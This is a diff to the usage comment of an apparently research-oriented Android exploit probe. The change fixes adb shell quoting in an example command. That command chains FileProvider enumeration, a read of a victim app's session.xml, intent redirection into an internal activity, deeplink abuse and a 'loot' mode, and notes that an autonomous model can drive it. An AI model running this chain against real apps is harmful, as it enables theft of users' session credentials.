@@ -54,14 +54,16 @@ import java.util.Locale;
  *   1. Buttons (for the PoC video — the log pane is the narration; docs/04).
  *   2. Headless, from adb, so an autonomous model can run and read it. ALWAYS pass -S: without it a second
  *      `am start` while the activity is alive is "delivered to top" and runs nothing. Scripted loops give
- *      every fire its own action (-a probe.fire.$N) so no two fires are ever collapsed.
- *        adb shell am start -S -n com.sanehunters.probe/.MainActivity \
+ *      every fire its own action (-a probe.fire.$N) so no two fires are ever collapsed. The whole command goes
+ *      in double quotes and every value in single quotes: adb shell re-parses the line on the DEVICE, where an
+ *      unquoted `;` (the extras separator), `&`, `?` or `->` is a separator, a glob or a redirect.
+ *        adb shell "am start -S -n com.sanehunters.probe/.MainActivity \
  *          --es run baseline,enumerate,provider,read,redirect,deeplink \
  *          --es victim com.target.app --es authority com.target.app.fileprovider \
- *          --es uri "content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml" \
- *          --es deeplink "targetapp://open?url=https://example.test/" \
+ *          --es uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml' \
+ *          --es deeplink 'targetapp://open?url=https://example.test/' \
  *          --es proxy com.target.app.ProxyActivity --es target com.target.app.InternalActivity \
- *          --es extra intent --es mode loot --ez finish false
+ *          --es extra intent --es mode loot --ez finish false"
  *        adb logcat -s PROBE:V        # every result is one line:  PROBE|<step>|<key>=<value>
  *        adb pull /sdcard/Android/data/com.sanehunters.probe/files/ $E/logs/probe/   # the file mirror
  *
